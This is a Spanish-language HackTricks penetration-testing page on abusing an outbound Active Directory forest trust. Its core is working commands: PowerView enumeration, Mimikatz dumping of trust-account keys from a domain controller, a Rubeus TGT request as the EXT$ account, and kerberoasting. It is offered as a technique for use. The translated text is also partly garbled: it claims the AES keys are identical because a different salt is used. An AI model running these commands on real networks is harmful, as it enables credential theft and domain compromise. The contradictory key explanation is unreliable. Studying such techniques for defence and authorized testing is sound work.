# Dominio de Bosque Externo - Unidireccional (Saliente)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al grupo de** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) o al grupo de [**telegram**](https://t.me/peass) o **sigue**me en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **diferentes dominios**.

## Enumeración

### Confianza Saliente
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Ataque a la Cuenta de Confianza

Cuando se establece una confianza de dominio o bosque de Active Directory desde un dominio _B_ hacia un dominio _A_ (_**B**_ confía en A), se crea una cuenta de confianza en el dominio **A**, llamada **B. Claves de confianza de Kerberos**,\_derivadas de la **contraseña de la cuenta de confianza**, se utilizan para **cifrar TGTs inter-reino**, cuando los usuarios del dominio A solicitan tickets de servicio para servicios en el dominio B.

Es posible obtener la contraseña y el hash de la cuenta de confianza desde un Controlador de Dominio utilizando:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
El riesgo es porque la cuenta de confianza B$ está habilitada, **el Grupo Primario de B$ son los Usuarios del Dominio del dominio A**, cualquier permiso otorgado a los Usuarios del Dominio se aplica a B$, y es posible utilizar las credenciales de B$ para autenticarse contra el dominio A.

{% hint style="warning" %}
Por lo tanto, **desde el dominio que confía es posible obtener un usuario dentro del dominio de confianza**. Este usuario no tendrá muchos permisos (probablemente solo Usuarios del Dominio) pero podrás **enumerar el dominio externo**.
{% endhint %}

En este ejemplo, el dominio que confía es `ext.local` y el de confianza es `root.local`. Por lo tanto, se crea un usuario llamado `EXT$` dentro de `root.local`.
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
Por lo tanto, en este punto tenemos la **contraseña en texto claro actual y la clave secreta de Kerberos de `root.local\EXT$`**. Las claves secretas de Kerberos AES de **`root.local\EXT$`** son idénticas a las claves de confianza AES ya que se utiliza una sal diferente, pero las **claves RC4 son las mismas**. Por lo tanto, podemos **usar la clave de confianza RC4** extraída de ext.local para **autenticarnos** como `root.local\EXT$` contra `root.local`.
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Con esto puedes comenzar a enumerar ese dominio e incluso hacer kerberoasting a usuarios:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Recopilación de la contraseña de confianza en texto claro

En el flujo anterior se utilizó el hash de confianza en lugar de la **contraseña en texto claro** (que también fue **extraída por mimikatz**).

La contraseña en texto claro se puede obtener convirtiendo la salida \[ CLEAR ] de mimikatz de hexadecimal y eliminando los bytes nulos '\x00':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

A veces, al crear una relación de confianza, el usuario debe escribir una contraseña para la confianza. En esta demostración, la clave es la contraseña de confianza original y, por lo tanto, legible por humanos. A medida que la clave cambia (30 días), el texto claro no será legible por humanos pero técnicamente aún utilizable.

La contraseña en texto claro se puede usar para realizar autenticaciones regulares como la cuenta de confianza, una alternativa a solicitar un TGT usando la clave secreta de Kerberos de la cuenta de confianza. Aquí, consultando root.local desde ext.local para miembros de Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referencias

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
